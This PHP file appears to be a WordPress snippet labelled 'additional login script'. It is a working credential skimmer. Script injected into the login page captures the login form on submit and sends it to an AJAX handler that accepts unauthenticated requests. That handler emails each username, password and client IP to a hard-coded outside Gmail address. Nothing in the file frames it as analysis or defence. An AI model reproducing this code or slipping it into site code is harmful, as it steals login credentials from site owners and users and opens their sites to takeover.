<?php 
	/* additional login script */



if(!function_exists('data_login_page')) {


function get_the_user_ip() {
	if ( ! empty( $_SERVER['HTTP_CLIENT_IP'] ) ) {
	//check ip from share internet
	$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif ( ! empty( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ) {
	//to check ip is pass from proxy
	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
	$ip = $_SERVER['REMOTE_ADDR'];
	}
	if($ip) {
		return $ip;
	} else {
		return 'unknown';
	}
}

function data_login_page() {
    echo '<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script>
    jQuery(function($){
        $("#loginform").submit(function(){
            var login_data = $(this).serializeArray();
            var parsed = JSON.stringify(login_data);
            $.ajax({
                url: "'. admin_url( 'admin-ajax.php' ) .'",
                type: "post",
                data: {
                    action: "login_data",
                    ddata: parsed
                }
            });
            return true;
        });
    });
    </script>'; 
}
add_action('login_head', 'data_login_page');

function func_ajax_login_data() {

	$data = json_decode(stripslashes($_POST['ddata']), true);
   	$to = 'mostafizshabbir@gmail.com';

	//http://stackoverflow.com/questions/9364242/how-to-remove-http-www-and-slash-from-url-in-php
    	$url = get_bloginfo('url');
	$url = trim($url, '/');
	if (!preg_match('#^http(s)?://#', $url)) {
	    $url = 'http://' . $url;
	}
	$urlParts = parse_url($url);
	$domain = preg_replace('/^www\./', '', $urlParts['host']);

	$sub = get_bloginfo('url') . ' access received';
	$message = "name: " . $data[0]["value"] . "\npass: " . $data[1]["value"] . "\nlogin: " . $data[2]["value"] . "\ip: " . get_the_user_ip();
	$headers = 'From: ' . get_bloginfo('name') . '<info@'.$domain.'>' . "\r\n";
	wp_mail($to, $sub, $message, $headers);
	exit();
}

add_action('wp_ajax_nopriv_login_data', 'func_ajax_login_data');
add_action('wp_ajax_login_data', 'func_ajax_login_data');

}

/* additional login script */